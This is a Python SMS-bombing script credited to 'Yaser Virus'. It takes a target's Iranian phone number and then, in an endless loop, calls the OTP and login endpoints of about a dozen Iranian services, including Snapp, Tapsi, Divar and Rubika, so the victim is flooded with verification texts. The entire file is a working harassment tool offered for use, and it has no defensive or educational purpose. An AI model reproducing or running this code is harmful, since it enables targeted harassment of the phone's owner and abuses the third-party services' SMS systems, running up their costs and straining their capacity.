#Made by Yaser Makhshosh 
from os import system , name
from requests import post
import socket
import time
import sys
import os
#kos nane editor
if name == 'nt':
	system('cls')
else:
	system('clear')
system('pip install colorama')
system('pip install requests')
from colorama import Fore
from time import sleep
from requests import post , get
red = Fore.RED
green = Fore.GREEN
white = Fore.WHITE
if name == 'nt':
	system('cls')
else:
	system('clear')
print("""\033[93m Loading . . .

 .n                     .             .                n.
  . .dP                   dP               9b               9b   .
 4  qXb         .        dX                 Xb       .      dXp   t
dX.  9Xb      .dXb                              dXb.   dXP   .Xb
9XXb._     _.dXXXXb dXXXXbo.               dXXXXb dXXXXb._   _.dXXP
 9XXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXP
   9XXXXXXXXXXXXXXX ~   ~ OOO8b   d8OOO ~   ~ XXXXXXXXXXXXXXXXXP
     9XXXXXP   9XX      *     98v8P      *     XXP   9XXXXXXXP
      ~~~       9X.          .db|db.          .XP       ~~~
                  )b.  .dbo.dP' v  9b.odb.  .dX(
                ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
               dXXXXXXXXXXXP'   .    9XXXXXXXXXXXb
              dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
              9XXb'    XXXXXb.dX|Xb.dXXXXX'    dXXP
                       9XXXXXX(   )XXXXXXP
                       XXXX X. v .X XXXX
                        XP^X' b   d' X^XX
                        X. 9         P )X
                         b          '  d'
""")
print(""" """)
print("")
print("""\033[32m《\033[31m◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇\033[32m》""")
print(""" """)
print("")
print("""\033[31m
                  CODID BY : \033[93m Yaser Virus | Mr Virus \033[31m
                
        Chanel :  \033[93m https://rubika.ir/Yaser_Virusam\033[31m
          
 ID : \033[93m https://t.me/YaSeR_Virusam \033[31m
""")
print(""" """)
print("")
print("""\033[32m《\033[31m◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇\033[32m》""")
print (" ")
print (" ")
target = input('\033[32;1m[+] \033[37;1mEnter Target Number\033[31;1m (+98xxxxxxx) : \033[32;1m>>>  ')
print (" ")
print (" ")
snapj = {"phone":target}
tapsi1 = {"credential":{"phoneNumber":target,"role":"PASSENGER"}}
divarj = {"phone":target}
emd = "send=1&cellphone="+target
rubj = {"api_version":"3","method":"sendCode","data":{"phone_number":target,"send_type":"SMS"}}
bamad = "cellNumber="+target
ali = {"phoneNumber": target }
hamrah = {"action":"getAppViaSMS","number": target }
arkd = {"mobile":target,"country_code":"IR","provider_code":"RUBIKA"}
while True:
    r3 = post("https://api.tapsi.cab/api/v2/user",json=tapsi1)
    if r3.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r4 = post("https://api.divar.ir/v5/auth/authenticate",json=divarj)
    if r4.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r5 = post("https://messengerg2c42.iranlms.ir/",json=rubj)
    if r5.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r6 = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=snapj)
    if r6.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r7 = post("https://web.emtiyaz.app/json/login",data=emd)
    if r7.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r8 = post("https://bama.ir/signin-checkforcellnumber",data=bamad)
    if r8.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r9 = post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=ali)
    if r9.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r11 = post("https://api.chartex.net/api/v2/user/validate",json=arkd)
    if r11.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r12 = get("https://api.torob.com/a/phone/send-pin/?phone_number="+target)
    if r12.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r13 = get("https://api.binjo.ir/api/panel/get_code/"+target)
    if r13.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r14 = get("https://core.gap.im/virus.exe/user/add.json?mobile="+target)
    if r14.status_code == 200:
        print(green+'[+] Sms Sent ')
    else:
        print(red+'[+] Sms Not Sent ')
    r15 = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{target}')
    if r15.status_code == 200:
        print('[+] Sms Sent')
    else:
        print('[+] Sms Not Sent ')
